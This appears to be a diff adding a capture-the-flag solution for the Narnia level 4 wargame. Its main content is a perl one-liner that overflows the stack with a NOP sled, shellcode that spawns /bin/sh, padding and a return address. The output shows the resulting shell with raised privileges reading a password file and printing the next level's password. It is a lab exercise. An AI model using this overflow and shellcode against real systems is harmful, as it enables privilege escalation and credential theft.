@@ -1,0 +1,9 @@
+##################### BASIC BUFFER OVERFLOW DIRECTLY AFFECTING THE STACK AS WE CAN'T USE ENV VARIABLES ###############################
+
+
+narnia4@narnia:/narnia$ ./narnia4 `perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x36 . "\x54\xd5\xff\xff"'`
+$ id
+uid=14004(narnia4) gid=14004(narnia4) euid=14005(narnia5) groups=14004(narnia4)
+$ cat /etc/narnia_pass/narnia5
+faimahchiy
+$ 
